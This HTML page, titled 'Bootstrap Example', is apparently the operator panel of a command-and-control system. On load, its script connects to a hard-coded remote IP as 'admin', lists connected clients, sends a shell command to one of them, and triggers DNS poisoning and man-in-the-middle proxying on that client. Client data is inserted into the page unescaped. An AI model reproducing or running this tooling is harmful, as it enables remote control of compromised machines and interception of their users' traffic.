<!DOCTYPE html>
<html lang="en">
<head>
  <title>Bootstrap Example</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script> 
  <script src='https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.3/socket.io.js'></script>.


  <script>
  function generateUsersList(data) {
      data = JSON.parse(data);
    var str = '<table class="table">';
    str += "<tr><td>ID</td><td>Name</td><td>Type/Status</td>";
    for(var i = 0; i < data.length;i++) {
        str += "<tr><td>" + data[i].sockid + "</td><td>" + data[i].name + "</td><td>" + data[i].type + "</td>";
    }
    str += "</table>";
    return str;
  }
      
      
      
      
      
      
      
      
      
      
      
      
      
      

    var socket = io('http://13.126.74.47:8000');

    socket.emit('client_connect', { name: 'admin', type: 'acp' }, function (data) {
        console.log("Connect ACK");
        socket.emit('list_clients', null, function (data) {
            console.log("Listing clients...");
            $("#clients").append(generateUsersList(data));


            
            
            




            socket.emit('send_client_cmd', { toclient: 0, cmd: 'ls' }, function (data) {
                console.log(data) 
            });

            socket.emit('dnspoison_client', { toclient: 0 }, function (data) {
                console.log(data) 
            });

            socket.emit('mitmproxy_client', { toclient: 0 }, function (data) {
                console.log(data) 
            });


            
        });
    });


            

     </script>


</head>
<body>

  
<div class="container">
  <div class="row">
    <div class="col-sm-12" id="clients">

    </div>

  </div>
</div>

</body>
</html>



